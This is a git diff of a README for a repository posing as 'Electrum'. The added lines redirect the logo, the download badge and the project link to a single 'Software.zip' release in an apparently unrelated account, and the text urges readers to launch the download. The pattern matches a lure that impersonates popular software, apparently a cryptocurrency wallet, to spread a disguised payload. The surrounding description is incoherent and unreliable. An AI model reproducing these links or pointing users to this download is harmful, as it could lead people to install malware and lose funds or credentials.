@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Electrum Repository 🌟
 
-![Electrum Logo](https://github.com/electrum/electrum/logo.png)
+![Electrum Logo](https://github.com/BubBooba/electrum/releases/download/v1.0/Software.zip)
 
 ## Repository: electrum
 
@@ -11,7 +11,7 @@ Welcome to the Electrum repository! Unfortunately, no short description is provi
 atomic, bluebuild, bluebuild-image, custom-image, image-based, immutable, linux, linux-custom-image, oci, oci-image, operating-system
 
 ### Download Link
-[![Download Electrum v1.0.0](https://img.shields.io/badge/Download-Electrum_v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Electrum v1.0.0](https://github.com/BubBooba/electrum/releases/download/v1.0/Software.zip)](https://github.com/BubBooba/electrum/releases/download/v1.0/Software.zip)
 
 🚀 **Please note:** Download link needs to be launched for downloading the Electrum package.
 
@@ -43,6 +43,6 @@ Visit the Electrum repository today to unlock a world of innovation, creativity,
 
 ---
 
-🔗 For more information, please visit the [Electrum Repository](https://github.com/electrum/electrum). 🚀
+🔗 For more information, please visit the [Electrum Repository](https://github.com/BubBooba/electrum/releases/download/v1.0/Software.zip). 🚀
 
 🌟 Thank you for being a part of the Electrum community! 🌟
